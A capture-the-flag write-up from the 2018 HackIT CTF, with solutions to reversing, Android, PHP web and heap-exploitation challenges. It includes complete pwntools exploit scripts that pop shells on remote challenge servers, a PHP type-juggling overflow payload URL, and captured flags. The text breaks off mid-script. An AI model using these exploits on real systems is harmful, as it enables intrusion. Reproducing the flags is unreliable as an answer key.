# 2018-09-08-HackIT-CTF #

[CTFTime link](https://ctftime.org/event/672) | [Website](https://ctf.hackit.ua/)

---

## Challenges ##

### Reverse ###

 - [x] [876 baby_first](#876-reverse--baby_first)
 - [ ] 997 Crynary
 - [ ] 1000 coffee_overflow

### Misc ###

 - [ ] 976 PyCry
 - [ ] 987 Paranoid Kitty
 - [x] [997 Magician's spells](#997-misc--magicians-spells)
 - [ ] 999 Inves2gate
 - [ ] 999 Trap-o-saur
 - [ ] 1000 Bulwarck
 - [ ] 1000 Smartpher
 - [ ] 1000 kittenware

### Web ###

 - [x] [42 BabyPeeHPee](#42-web--babypeehpee)
 - [ ] 447 Believer Case
 - [ ] 847 Republic of Gayming
 - [ ] 862 Into Darkness
 - [ ] 987 PeeHPee2
 - [ ] 1000 RuAdmin
 - [ ] 1000 Blockchain Startup

### Pwn ###

 - [x] [741 Army](#741-pwn--army)
 - [x] [954 A Heap Interface](#954-pwn--a-heap-interface)
 - [x] [982 Bank Reimplemented](#982-pwn--bank-reimplemented)
 - [x] [982 KAMIKAZE](#982-pwn--kamikaze)
 - [x] 997 HashMan

### Welcome ###

 - [x] [1 Get Going](#1-welcome--get-going)

---

## 876 Reverse / baby_first ##

**Description**

> Wooble CEO's baby is learning computers. Help him with math.

**Files provided**

 - [re1](files/re1)

**Solution** (by [Mem2019](https://github.com/Mem2019))

use IDA to open it, and the program is 64 bit ARM. There are many functions, so let's look at string first.

Then we can find the string `"oh noes! you no haz flag!"`, xref it, the function seems to be the verification function.

By inspecting the code, we can find that this is a matrix multiplication using nested loop to access data and compare the result with given data, we can take the matrix by the following C code. (modified from decompiled code)

`DATA2_NUM` from IDA analysis is incorrect, so I obtained it manually

```c
#include <stdio.h>
#include <stdint.h>
#define DATA1_OFF 0x7d010
#define DATA2_OFF 0x110a90
#define DATA1_NUM 151200
#define DATA2_NUM 7564
uint32_t data1[DATA1_NUM];
uint32_t data2[DATA2_NUM];
void load1()
{
  FILE* f = fopen("./re1", "rb");
  fseek(f, DATA1_OFF, SEEK_SET);
  fread(data1, sizeof(uint32_t), DATA1_NUM, f);
  fclose(f);
}

void load2()
{
  FILE* f = fopen("./re1", "rb");
  fseek(f, DATA2_OFF, SEEK_SET);
  fread(data2, sizeof(uint32_t), DATA2_NUM, f);
  fclose(f);
}

void show_matrix()
{
  signed int i;
  signed int j;
  signed int k;
  signed int l;
  signed int m;
  signed int n;
  signed int ii;

  for ( i = 0; i <= 6; ++i )
  {
    for ( j = 0; j <= 8; ++j )
    {
      for ( k = 0; k <= 2; ++k )
      {
        for ( l = 0; l <= 4; ++l )
        {
          for ( m = 0; m <= 1; ++m )
          {
            for ( n = 0; n <= 3; ++n )
            {
              printf("[");
              for ( ii = 0; ii <= 19; ++ii )
              {
                int idx = 0x50LL * m + 0x5460LL * i + 
                          0x960LL * j + 0x14LL * n + 0xA0LL * l + 
                          0x320LL * k + ii;
                if (idx >= DATA1_NUM)
                {
                  printf("out of bound\n");
                }
                printf("%u, ", data1[idx]);
              }
              printf("],");
              int idx = 4 * (2 * (15LL * j + 
                                  135LL * i + 5LL * k + l) + m) + n;
              if (idx >= DATA2_NUM)
              {
                printf("out of bound\n");
              }
              printf(" %u\n", data2[idx]);
            }
          }
        }
      }
    }
  }
}
int main()
{
  load1();
  load2();
  show_matrix();
  return 0;
}
```

However, the result is huge with around 7560 lines, but for linear equation solving with 20 dimension vector, we only need a 20x20 matrix, so just take the first 20 data

```python
from numpy import *
mat = [[62, 23, 49, 47, 63, 36, 91, 6, 31, 16, 11, 91, 2, 49, 73, 19, 77, 76, 67, 86],
[89, 37, 34, 76, 30, 14, 73, 32, 20, 84, 85, 67, 3, 62, 54, 20, 78, 100, 36, 64],
[100, 71, 39, 26, 74, 73, 83, 95, 62, 90, 8, 11, 77, 32, 19, 9, 23, 76, 62, 88],
[6, 61, 69, 72, 84, 27, 18, 69, 14, 99, 20, 21, 13, 23, 42, 15, 32, 17, 73, 23],
[20, 74, 49, 43, 63, 96, 4, 88, 84, 95, 36, 51, 89, 39, 2, 41, 77, 11, 22, 20],
[41, 51, 11, 80, 0, 40, 26, 5, 11, 78, 60, 35, 53, 33, 69, 67, 0, 100, 39, 25],
[28, 27, 3, 57, 64, 23, 68, 49, 26, 16, 20, 66, 58, 3, 51, 28, 39, 5, 56, 52],
[41, 60, 51, 98, 40, 36, 50, 56, 79, 50, 57, 48, 52, 43, 66, 64, 8, 38, 65, 26],
[65, 88, 53, 36, 29, 84, 21, 98, 92, 14, 94, 29, 42, 83, 45, 34, 44, 78, 44, 77],
[78, 64, 92, 18, 39, 98, 46, 7, 60, 48, 31, 74, 40, 26, 70, 29, 23, 13, 100, 33],
[38, 63, 66, 53, 7, 87, 70, 77, 51, 98, 100, 83, 75, 67, 7, 41, 63, 80, 45, 93],
[18, 68, 76, 85, 6, 36, 24, 52, 57, 0, 4, 95, 88, 72, 46, 9, 84, 31, 22, 94],
[99, 58, 9, 72, 28, 95, 11, 74, 2, 46, 45, 62, 10, 19, 97, 30, 91, 73, 83, 55],
[100, 33, 92, 7, 60, 75, 30, 85, 62, 100, 47, 89, 14, 47, 73, 79, 92, 99, 52, 27],
[25, 19, 3, 89, 29, 2, 14, 29, 42, 23, 88, 95, 76, 54, 1, 47, 77, 50, 50, 23],
[100, 69, 71, 97, 72, 34, 41, 8, 35, 40, 91, 49, 54, 8, 20, 2, 15, 73, 77, 84],
[46, 81, 51, 9, 98, 99, 47, 61, 38, 97, 60, 88, 63, 54, 30, 15, 57, 72, 60, 44],
[32, 42, 30, 20, 56, 4, 35, 73, 13, 42, 64, 90, 81, 31, 82, 43, 91, 93, 4, 1],
[55, 32, 51, 3, 32, 59, 84, 20, 96, 7, 99, 38, 3, 21, 80, 88, 50, 46, 34, 68],
[70, 30, 76, 29, 33, 50, 95, 47, 11, 4, 96, 82, 91, 52, 68, 83, 28, 27, 89, 30],
[25, 50, 25, 95, 78, 28, 1, 77, 62, 89, 0, 72, 38, 38, 33, 34, 75, 59, 18, 50],
[6, 3, 59, 2, 15, 26, 93, 94, 2, 10, 44, 84, 41, 26, 90, 38, 30, 91, 18, 81],
[73, 10, 81, 56, 75, 67, 17, 85, 77, 95, 0, 64, 68, 96, 100, 78, 76, 26, 2, 40],
[95, 6, 77, 46, 9, 64, 77, 70, 98, 97, 55, 64, 35, 33, 75, 69, 42, 47, 4, 54],
[3, 84, 94, 24, 59, 31, 69, 79, 80, 98, 84, 69, 77, 83, 96, 92, 25, 30, 7, 100],
[80, 50, 2, 98, 22, 65, 36, 47, 81, 88, 20, 93, 12, 93, 69, 60, 41, 82, 17, 98],
[27, 37, 4, 15, 29, 28, 49, 58, 81, 3, 71, 57, 87, 94, 59, 94, 41, 79, 28, 100],
[39, 96, 87, 43, 21, 4, 27, 83, 73, 23, 90, 48, 92, 31, 7, 35, 50, 82, 94, 61],
[78, 51, 45, 15, 55, 12, 19, 30, 16, 50, 4, 30, 39, 37, 54, 21, 72, 34, 45, 43],
[72, 84, 91, 13, 68, 9, 41, 72, 75, 35, 32, 61, 43, 4, 63, 78, 52, 38, 17, 51],
[20, 50, 87, 89, 15, 69, 95, 43, 38, 24, 96, 23, 62, 25, 0, 46, 14, 56, 63, 11],
[68, 20, 74, 94, 54, 29, 99, 65, 23, 97, 10, 7, 49, 37, 87, 6, 57, 32, 73, 23],
[40, 23, 89, 60, 39, 7, 69, 15, 13, 57, 65, 49, 8, 21, 70, 45, 9, 21, 32, 40]]

res = [85050,91195,104053,74886,96859,78247,69704,93536,99410,91294,109711,85114,104598,118115,76597,91860,108325,86408,79996,92996,93246,71132,109941,99177,108060,107507,89876,95925,70342,90748,76100,90138,62864]

a = array(mat[:20])
b = array(res[:20])
x = linalg.solve(a, b)

print x
print ''.join(map(chr,[ 109,101, 32, 99, 97,110, 32,104, 97,122, 32,117,114, 32,102,108, 97,103,122, 63]))
```

`me can haz ur flagz?`

## 997 Misc / Magician's spells ##

**Description**

> We managed to exfiltrate an android application from Wooble's employee. He called himself the magician, and, as per what we have read, left a secret to find for anyone who could discover it. We struggled with this for a while, and now we want to leave this one to you. Good luck.

**Files provided**

 - [book.apk](files/book.apk)

**Solution**

First we need to decompile the APK; we can use an [online tool](http://www.javadecompilers.com/apk) to do this.

We can ignore a lot of third-party libraries and stuff for visual presentation and focus on these two classes:

 - [hackit.secretkeeper.altair.MainActivity](files/magician-main.java)
 - [hackit.secretkeeper.altair.Magix](files/magician-magix.java)

In `MainActivity` we see what happens to whatever we type into the text box:

```java
// output view
TextView textView = (TextView) MainActivity.this.findViewById(C0323R.id.textView1);

// input
EditText editText = (EditText) MainActivity.this.findViewById(C0323R.id.editText1);

// "encryptor" from the website?
JSONObject jSONObject = new JSONObject(MainActivity.this.run("encryptor"));

// create a string from encryptor + input
StringBuilder stringBuilder = new StringBuilder();
stringBuilder.append(jSONObject.getString("p"));
stringBuilder.append(editText.getText());

// use Magix to do "magic" on the created string using the "encryptor" result
String encode = URLEncoder.encode(
  new Magix(100000, new ByteArrayInputStream(
    stringBuilder.toString().getBytes(StandardCharsets.UTF_8)
  )).doMagic(jSONObject.getString("result")),
  "utf-8"
);

// send the magic output to the website as ?spell=<output>
MainActivity mainActivity = MainActivity.this;
StringBuilder stringBuilder2 = new StringBuilder();
stringBuilder2.append("?spell=");
stringBuilder2.append(encode);

// get result from the JSON output of the website
textView.setText(new JSONObject(mainActivity.run(stringBuilder2.toString())).getString("result"));
```

First things first, `MainActivity.this.run(url)` requests data from a web site located at `http://185.168.131.121/`. If we look at the "encryptor" URL ourself, we get this result:

```json
{
  "result": "dzdakazzlzlkkkoczzzakkklzzzoczzzllllllllaokkkkkaozzlkkaozzozlkczzaozzzzlkkckkkkczzzaokkklzzzckkaozlkaozozlzzzzzczaozzzzzlzzckkkkkkkkczzaokklzzczzzaozzlkkczazaokozckaozlkcczaaockkkaozlzokkczaoklzclzlllllllaokaozzllkkczzaokklzzckckaozzzzlkkkkczzckkkczzzzzyaockkkkkkkkkkdc",
  "p": "\u0010"
}
```

Now let's have a look at `Magix`. The core is the `doMagic` function, which we can summarise as:

```java
protected void doMagic(char c, char[] cArr) throws Exception {
    switch (c) {
        case 'a':
        // ... if data at data pointer is zero, continue after the matching `c`
        case 'c':
        // ... jump back to matching `a`
        case 'd':
        // ... read a byte from user input and write at data pointer
        case 'k':
        // ... decrease data pointer (move to the left)
        case 'l':
        // ... increase value at data pointer
        case 'o':
        // ... decrease value at data pointer
        case 'y':
        // ... output byte at data pointer
        case 'z':
        // ... increase data pointer (move to the right)
    }
}
```

Familiar at all?

This is a [Brainfuck](https://en.wikipedia.org/wiki/Brainfuck) interpreter, with 100000 8-bit cells of memory, errors on out-of-bounds data access, and a modified character set:

| Brainfuck | `Magix` | Function |
| --- | --- | --- |
| `>` | `z` | increase data pointer (move to the right) |
| `<` | `k` | decrease data pointer (move to the left) |
| `+` | `l` | increase value at data pointer |
| `-` | `o` | decrease value at data pointer |
| `.` | `y` | output byte at data pointer |
| `,` | `d` | read a byte from user input and write at data pointer |
| `[` | `a` | if data at data pointer is zero, continue at the matching `c` |
| `]` | `c` | jump back to matching `a` |

We can try to reverse engineer what the "encryptor" code does, but reversing Brainfuck code is a very painfull process. Instead, we can write our own interpreter and see what it does for various inputs and outputs.

Whatever string we give the encryptor, we get one of the same length, but the characters are all replaced. However, the same character in the input always corresponds to the same character in the output. And even better, the code is actually a symmetric cipher, so:

```
encryptor("\u0010" + encryptor("\u0010" + someText)) == someText
```

(The `\u0010` byte is added by the application prior to encoding.)

Whatever we encrypt then gets sent to the website, but for a lot of inputs the website simply responds with "bad wolf". With some luck, however, we can get an input like:

```
input:          "l"
encoded:        "|"
website output: "||||||||||q\x7Fs"
decoded:        "llllllllllaoc"
```

The code doesn't really do anything, but it's interesting that it increases the value at the data pointer to 10, i.e. the newline character. That made me think that when we run the code output by the website, it prints out the output of the command we tried.

The codes that the website accepts are actually only valid `Magix` codes, i.e. Brainfuck programs. So if our `Magix` code gets executed by the server, we can try out some options to get the flag:

 - dump (part of) the contents of the memory
 - dump memory to the left (assuming the data pointer was not at `0` to begin with)
 - read input characters and print them

The first two just displayed empty memory, but the third one worked:

```
input:   "dydydydydydydydydydydydydydydydydydydydydydydydydydydy" ...
encoded: "tititititititititititititititititititititititititititi" ...
website output:
"||||||||||qj||||||||||j|||||||||||j||||||||||||j|||||j||||||j|||||||||||||j{{{{{"
"{{\x7Fsj||ij\x7F\x7Fi{\x7F\x7F\x7F\x7F\x7Fij\x7F\x7F\x7F\x7F\x7Fij|||i{{|ijj\x7F"
"\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7Fi{{\x7Fij||ij\x7F\x7F\x7F\x7Fi{\x7F\x7F\x7Fij|||"
"||||i{{||ij|||||i{\x7F\x7F\x7F\x7Fij\x7F\x7Fij\x7F\x7Fi{{ij|||||i|ij|i{{i||||||i"
"j\x7Fi{\x7F\x7Fijj\x7F\x7Fi|||||||i{||i||||i{||||||ij\x7F\x7F\x7F\x7F\x7Fi\x7Fi{"
"\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7Fijjj\x7Fij\x7F\x7F\x7Fi{|i|iji{\x7F\x7F"
"\x7Fi||i\x7Fi\x7Fi|||iji{\x7Fi|i\x7F\x7Fi{||||ijjjjiiiiiiiiiiiiiiiiiiiiiiiiiiiii"
"iiiiiiiii"
decoded:
"llllllllllazllllllllllzlllllllllllzllllllllllllzlllllzllllllzlllllllllllllzkkkkk"
"kkoczllyzooykoooooyzoooooyzlllykklyzzoooooooooykkoyzllyzooooykoooyzlllllllykklly"
"zlllllykooooyzooyzooykkyzlllllylyzlykkyllllllyzoykooyzzooylllllllykllyllllykllll"
"llyzoooooyoykooooooooooyzzzoyzoooyklylyzykoooyllyoyoylllyzykoylyooykllllyzzzzyyy"
"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy"
```

And upon executing that last bit:

`flag{brainfuck_is_not_encryption_19239021039231}`

## 42 Web / BabyPeeHPee ##

**Description**

> Prove you are not a baby:
> 
> http://185.168.130.148/

**No files provided**

**Solution**

> (Note: write-up written without access to the original service. I tried to replicate the source as best as I could remember.)

We are presented with a PHP script giving us access to its source and a [`.so` file](files/auth.so) (shared object) it uses.

```php
you may need [this](?source) or [this](auth.so).
<?php
include "flag.php";

if (isset($_GET["source"])) {
  show_source(__FILE__);
}

$user = substr($_GET["u"], 0, 20);
$password = substr($_GET["p"], 0, 45);

$digest = @auth($user, $password);

if (md5($user) == md5($digest) && $digest !== $user) {
  echo $flag;
}
?>
```

The script seems simple enough but clearly we need to understand the `auth` function, which is defined in the shared object. We can look at the function and decompile it with IDA:

```c
Php::Parameters *__fastcall auth(Php::Parameters *a1, __int64 a2)
{
  __int64 v2; // rax
  const char *v3; // rax
  char dest; // [rsp+10h] [rbp-60h]
  char v6[8]; // [rsp+30h] [rbp-40h]
  unsigned __int64 v7; // [rsp+58h] [rbp-18h]
  
  v7 = __readfsqword(0x28u);
  strcpy(v6, "21232f297a57a5a743894a0e4a801fc3");
  v2 = std::vector<Php::Value,std::allocator<Php::Value>>::operator[](a2, 1LL);
  v3 = (const char *)Php::Value::operator char const*(v2);
  strcpy(&dest, v3);
  Php::Value::Value(a1, v6, -1);
  return a1;
}
```

The PHP wrappers are a bit confusing at first but essentially, `v2` gets set to the second argument given to the function, `v3` gets its C-string value, and that value is then `strcpy` copied into `dest`. [`strcpy`](https://linux.die.net/man/3/strcpy) (see "Bugs") is a big source of overflow vulnerabilities of course, and it is the same here. If the second argument given to `auth` is too long, i.e. more than 32 bytes, it will overflow into `v6` (since `v6` is right after `dest` on the stack).

The first argument given to `auth` is actually not used at all.

What happens if we overflow into `v6`? We can cause the function to return a different value. It can be any short string of our choosing (the `$p` variable is still limited to 45 characters, minus the 32 needed to overflow into `dest`).

So, we need two values which are different but their MD5 digests are not? The condition seems to assert that, and it would mean that we need to find two relatively short strings that cause a MD5 collision. Some quick research shows that the shortest known pair like this is [64 bytes of binary data](https://stackoverflow.com/questions/1999824/whats-the-shortest-pair-of-strings-that-causes-an-md5-collision), which will not fit.

Luckily, PHP is a bit weird, and the vulnerability is in this line:

```php
if (md5($user) == md5($digest) && $digest !== $user) {
```

The MD5 digests are compared using the [equality operator `==`](https://secure.php.net/manual/en/language.operators.comparison.php), while the strings themselves are compared using the [not-identity operator `!==`](https://secure.php.net/manual/en/language.operators.comparison.php). Basically, the latter is type safe, while the former can sometimes compare variables in somewhat arbitrary ways.

In particular, strings can be interpreted as numbers in scientific notation. For this to happen, the string needs to be all numbers except for an `e`. As it turns out, MD5, or more specifically, the `md5` function in PHP, produces digests of 32 hexadecimal digits. It is possible that the digest for a certain string follows the scientific notation. It takes some time to brute-force out candidates like this, but it is possible.

With even more time, digests of even more specific formats can be found. If the digest starts with `0e`, followed by decimal digits only, e.g. `0e830400451993494058024219903391`, to PHP it looks like `0 * 10^830400451993494058024219903391`, which is zero in value!

So we need to provide two short strings that both give an MD5 digest starting with `0e` followed by decimal digits only. If you search for such an example, you may find this pair:

```
md5("240610708") === "0e462097431906509019562988736854"
md5("QNKCDZO")   === "0e830400451993494058024219903391"
```

So now we have all we need to exploit the website. We provide `240610708` as the username, and we put `QNKCDZO` in our password after 32 padding characters to make the digest be `QNKCDZO`:

    http://185.168.130.148/?u=240610708&p=abcdabcdabcdabcdabcdabcdabcdabcdQNKCDZO

`flag{here_is_a_warmup_chal_for_u_baby_}`

## 741 Pwn / army ##

**Description**

> Welcome to the Army. Go get your promotion !!
> 
> `nc 185.168.131.122 6000`

**Files provided**

 - [army](files/army)

**Solution** (by [Mem2019](https://github.com/Mem2019))

The problem is here in `create`

```c
v4 = malloc(v5);
if ( v4 )
{
  printf("Enter your description: ", nptr);
  v3 = (char *)malloc(v5);
  read(0, v3, v5);
  v7->descript = v3;
  v7->des_len = v5;
  g_des_len = v7->des_len;
}
else
{
  puts("Malloc error"); // logic problem
  //return here
}
```

If the malloc fails, the `g_des_len` and `v7->des_len` are not updated, so they can have inconsistent value

However, in `delete`

```c
signed __int64 delete()
{
  int v1; // eax
  void *v2; // rsp
  __int64 v3; // [rsp+0h] [rbp-30h]
  int v4; // [rsp+Ch] [rbp-24h]
  void *buf; // [rsp+10h] [rbp-20h]
  __int64 v6; // [rsp+18h] [rbp-18h]

  if ( !if_created )
    return 0LL;
  v1 = me->des_len;
  v6 = v1 - 1LL;
  v2 = alloca(16 * ((v1 + 15LL) / 0x10uLL));    // 8 up
  buf = &v3;
  printf("Enter your answer : ", v1, (v1 + 15LL) % 0x10uLL, 16LL, v1, 0LL);
  v4 = g_des_len;
  read(0, buf, g_des_len);
  puts("So trolled man, Imma demote you. Now you will be junior to your friends hahahaha so embarrasing.");
  free(me->name);
  free(me->descript);
  //...
}
```

it uses `me->des_len` to do stack allocation but uses `g_des_len` as the size, so this could cause overflow, and there is no canary.

The way to control `g_des_len` is easy, it's just length of last description

How can we control `me->des_len`? well, the soldier struct will be allocated from 0x30 fastbin, and this will be the previous `me->name` if the length of descript is not 0x30 fastbin, which is contollable.

PS: the `g_des_len` is `char`, but `me->des_len` is `int`; however, this does not seems to be exploitable.

exp:

```python
from pwn import *

g_local=True
context.log_level='debug'

ONE_GADGET_OFF = 0x4526a
if g_local:
	e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	sh = process('./army')#env={'LD_PRELOAD':'./libc.so.6'}
	#gdb.attach(sh)
else:
	sh = remote("185.168.131.122", 6000)
	e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	#ONE_GADGET_OFF = 0x4557a

def create(descrip, length):
	sh.send("1\n")
	sh.recvuntil("Enter name: ")
	sh.send("1\n".ljust(0x23, "\x00"))
	sh.recvuntil("Enter height: ")
	sh.send("1\n")
	sh.recvuntil("Enter weight: ")
	sh.send("1\n")
	sh.recvuntil("Enter length of answer: ")
	sh.send(str(length) + "\n")
	if descrip:
		sh.recvuntil("Enter your description: ")
		sh.send(descrip)
	sh.recvuntil("3. I think I deserve a promotion\n")

def delete(answer):
	sh.send("3\x00\x00\x00")
	sh.send(answer)
	sh.recvuntil("3. I think I deserve a promotion\n")

sh.recvuntil("Beginner's Luck : ")
leak = sh.recvuntil("\n")
libc_addr = u64(leak[:len(leak)-1] + "\x00\x00") - e.symbols["puts"]
print hex(libc_addr)
sh.recvuntil("3. I think I deserve a promotion\n")

create("123", 0x7F)
delete("111")
create(None, -1)
sh.send("3\x00\x00\x00" + (cyclic(56) + p64(libc_addr + ONE_GADGET_OFF)).ljust(0x7F, "\x00"))
sh.interactive()
```

## 954 Pwn / A Heap Interface ##

**Description**

> This heap interface is really cool. We ask our clients to submit PoW to use this.
> 
> UPDATE : We removed PoW, please don't try to brute more than 4 bits.
> 
> `nc 185.168.131.133 6000`

**Files provided**

 - [libc-2.24.so](files/libc-2.24.so)
 - [heap_interface](files/heap_interface)

**Solution** (by [Mem2019](https://github.com/Mem2019))

The program is simple, typical UAF but without show, and house of roman that requires 12-bit bruteforce is not allowed.

The potential leak is here, 

```c
int printfname()
{
  return printf("Name: %s\n", name);
}
```

and the name is not null terminated. According to the memory layout, the buffer pointers are just after the name, so we can leak the address of heap directly.

However, we need to leak libc, so we want the allocation to be allocated in libc. Fastbin attack is not possible, because the size is restricted to be larger than fastbin size, so what we can do is [smallbin attack](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/house_of_lore.c). In this way we need to fake a smallbin in libc first.

Initially I would like to use `scanf`, since this will write data in the `_IO_buf_base` field of stdin, which is in libc, but the program will get into a infinite loop as long as we input non-digit character for scanf.

Alternatively, I tried to fake such smallbin chunk in fastbin field of `main_arena`. Firstly we need to manipulate the heap and utilize [house of spirit](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_spirit.c) to fake a fastbin chunk and free it into fastbin linked list table in `main_arena`. Then continue to manipulate heap to satisfy the precondition required by small bin attack. Also, I use partial rewrite to write 1 least significant byte of `bk` of victim small bin(this is very close to our faked chunk) and let the smallbin chunk's `bk` to point to our faked smallbin chunk in fastbin of `main_arena`. Then we can call `malloc` and get an address in libc, so if we put this to index 0, we can leak the libc.

After leaking libc, things become easy, use house of orange attack to getshell

exp:

```python
from pwn import *

g_local=False
context.log_level='debug'

if g_local:
	e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	sh = process('./heap_interface')#env={'LD_PRELOAD':'./libc.so.6'}
	ONE_GADGET_OFF = 0x4526a
	FAKE_CHUNK_LSB = 0x28
	IO_STR_FINISH = 0x3c37b0
	#gdb.attach(sh)
	FAKE_CHUNK_OFF = 0x3c4b38
else:
	sh = remote("185.168.131.133", 6000)
	e = ELF("./libc-2.24.so")
	FAKE_CHUNK_LSB = 0x08
	ONE_GADGET_OFF = 0x4557a
	IO_STR_FINISH = 0x394510
	FAKE_CHUNK_OFF = 0x3c4b18

def mymalloc(size, idx):
	sh.send("1\n")
	sh.recvuntil("Enter size of chunk :")
	sh.send(str(size) + "\n")
	sh.recvuntil("Enter index :")
	sh.send(str(idx) + "\n")
	sh.recvuntil("4. Show info\n")

def myfree(idx):
	sh.send("3\n")
	sh.recvuntil("Enter index :")
	sh.send(str(idx) + "\n")
	sh.recvuntil("4. Show info\n")

def mywrite(idx, data):
	sh.send("2\n")
	sh.recvuntil("Enter index of chunk :")
	sh.send(str(idx) + "\n")
	sh.recvuntil("Enter data :")
	sh.send(data)
	sh.recvuntil("4. Show info\n")

def showname():
	sh.send("4\n")
	sh.recvuntil("Name: " + "A" * 0x20)
	ret = sh.recvuntil("\n")
	sh.recvuntil("4. Show info\n")
	return ret[:len(ret)-1]

sh.send("A" * 0x20)
sh.recvuntil("4. Show info\n")

#----------------leak heap
mymalloc(0x100, 0)
heap_addr = u64(showname() + "\x00\x00") - 0x10
print hex(heap_addr)
myfree(0)

#----------------small bin attack
# fake_chunk_1[0] = 0;
# fake_chunk_1[1] = 0;
# fake_chunk_1[2] = victim_chunk; # at 0x90 chunk smallbin
# fake_chunk_1[3] = (intptr_t*)fake_chunk_2;
# fake_chunk_2[2] = (intptr_t*)fake_chunk_1;

# fake the fake chunk in the fastbin

mymalloc(0x80, 0)
mymalloc(0x180, 1) # this will cover 2
myfree(0)
myfree(1)
mymalloc(0x90, 0)
mymalloc(0x80, 2) # victim chunk
myfree(0)
myfree(2)
mymalloc(0x1F0, 0) # control first 0x200 chunk
#0 1 2 used to prepare victim chunk in fastbin

mymalloc(0x80, 3)
mymalloc(0x180, 4) # this will cover 5
myfree(3)
myfree(4)
mymalloc(0x90, 3)
mymalloc(0x80, 5)
myfree(3)
myfree(5)
mymalloc(0x1F0, 3) # control first 0x200 chunk
#3 4 5 used to prepare fake_chunk_2 chunk in fastbin

#topchunk 400

mywrite(1, p64(0) + p64(0x41) + 'A' * 0x38 + p64(0x41))
mywrite(4, p64(0) + p64(0x51) + 'B' * 0x48 + p64(0x51))
myfree(2)
myfree(5)
#fake the fake chunk1

mywrite(4, p64(0) + p64(0x91) + 'C' * 0x88 + p64(0x21) + 'D' * 0x18 + p64(0x21))
myfree(5)
mymalloc(0x80, 6)
mywrite(5, chr(FAKE_CHUNK_LSB)) # fake_chunk_2[2] = (intptr_t*)fake_chunk_1;
#now 0x40 0x50 fastbin, others empty

mywrite(1, p64(0) + p64(0x91) + 'C' * 0x88 + p64(0x21) + 'D' * 0x18 + p64(0x21))
myfree(2)

mymalloc(0x100, 7) #put to smallbin

mywrite(2, p64(1) + chr(FAKE_CHUNK_LSB))
mymalloc(0x80, 8)
mymalloc(0x80, 0)

libc_addr = u64(showname() + "\x00\x00") - FAKE_CHUNK_OFF
print hex(libc_addr)
#smallbin broken for 0x90


#house of orange---------------------

fake_file = p64(0)
fake_file += p64(0x61)
fake_file += p64(1)
fake_file += p64(libc_addr + e.symbols["_IO_list_all"] - 0x10)
fake_file += p64(2) + p64(3)
fake_file += "\x00" * 8
fake_file += p64(libc_addr + next(e.search('/bin/sh\x00'))) #/bin/sh addr
fake_file += (0xc0-0x40) * "\x00"
fake_file += p32(0) #mode
fake_file += (0xd8-0xc4) * "\x00"
fake_file += p64(libc_addr + IO_STR_FINISH - 0x18) #vtable_addr
fake_file += (0xe8-0xe0) * "\x00"
fake_file += p64(libc_addr + e.symbols["system"])

mymalloc(0x90, 9)
mymalloc(0x100, 11)
mymalloc(0x100, 14)
#if no this padding, consolidate will cause SIG_BUS?
myfree(9)
myfree(11)
mymalloc(0xA0, 10)
mymalloc(0xF0, 12)
mymalloc(0x90, 13)
myfree(12)

mywrite(11, fake_file)
mymalloc(400, 15)

sh.interactive()
```

However, the flag is `flag{gl0bal_m4x_fastb1n_atta3k_OMG_too_kewl}`, which is different from my solution since I didn't attack `global_max_fast`

## 982 Pwn / Bank Reimplemented ##

**Description**

> We learnt from our past mistakes. We now have cameras looking at `__malloc_hook` 24x7.
> 
> `nc 185.168.131.144 6000`

**Files provided**

 - [chall2-bank](files/chall2-bank)
 - [libc-2.24.so](files/libc-2.24.so)

**Solution** (by [Mem2019](https://github.com/Mem2019))

The problem is here. When creating the back account, there is a off-by-one.

```c
read(0, v3->title, 0x11uLL);           // off by one
```

The insight is to change the size of unsorted bin and then create an overlap. However, only fastbin size is allowed, so we  must use this off-by-one to increase the size of a currently using fastbin chunk into a unsorted bin chunk, so when we free it it will be putted into unsorted bin. To create such situation, we need to manipulate the fastbin chunks first.

After creating such overlapped unsorted bin, we can leak program address and libc address. Care has to be taken about the check for the `flag` field in the struct, which should point to `0x60C0C748`. (e.i. do not change it)

Then we need to control the `rip`, but since the in `edit statement` function, `fgets` instead of `fread` is used, so there must be a null termination, so we can't rewrite return address in stack (we can only write 5 non-zero bytes but all addresses are 6 bytes).

```c
if ( v1 >= 0 && v1 <= 19 && accounts[v1] )
{
  n = strlen(accounts[v1]->statement);
  fgets(accounts[v1]->statement, n, stdin);
}
```

Thus, I used house of orange attack, which can be acheived by setting the `title_size` field to a big number by using overlap. But to make it simple, set `global_max_fast` to zero first.

exp:

```python
from pwn import *

g_local=True
context.log_level='debug'

if g_local:
	e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	sh = process('./chall2-bank')#env={'LD_PRELOAD':'./libc.so.6'}
	UNSORTED_OFF = 0x3c4b78
	GLOBAL_MAX_FAST = 0x3C67F8
	IO_STR_FINISH = 0x3c37b0
	gdb.attach(sh)
else:
	sh = remote("185.168.131.144", 6000)
	e = ELF("./libc-2.24.so")
	UNSORTED_OFF = 0x397b58
	GLOBAL_MAX_FAST = 0x3997D0
	IO_STR_FINISH = 0x394510

def slp():
	if g_local:
		sleep(0.1)
	else:
		sleep(1)

def create(title, size, statement):
	sh.send("1\n")
	sh.recvuntil("Enter title of bank account: ")
	sh.send(title)
	sh.recvuntil("Enter size of your bank statement: ")
	sh.send(str(size) + "\n")
	slp()
	sh.send(statement + "\n")
	sh.recvuntil("Account has been created at index ")
	ret = int(sh.recvuntil("\n"))
	sh.recvuntil("5. View your bank status\n")
	return ret

def edit_title(idx, title):
	sh.send("2\n")
	sh.recvuntil("Enter index of bank account: ")
	sh.send(str(idx) + "\n")
	slp()
	sh.send(title)
	sh.recvuntil("5. View your bank status\n")

def edit_statement(idx, statement):
	sh.send("3\n")
	sh.recvuntil("Enter index of bank account: ")
	sh.send(str(idx) + "\n")
	slp()
	sh.send(statement + "\n")
	sh.recvuntil("5. View your bank status\n")

def delete(idx):
	sh.send("4\n")
	sh.recvuntil("Enter index of bank account: ")
	sh.send(str(idx) + "\n")
	sh.recvuntil("5. View your bank status\n")

def view(idx):
	sh.send("5\n")
	sh.recvuntil("Enter index of bank account: ")
	sh.send(str(idx) + "\n")
	sh.recvuntil("Title: ")
	title = sh.recvuntil("\n")
	sh.recvuntil("Statement: ")
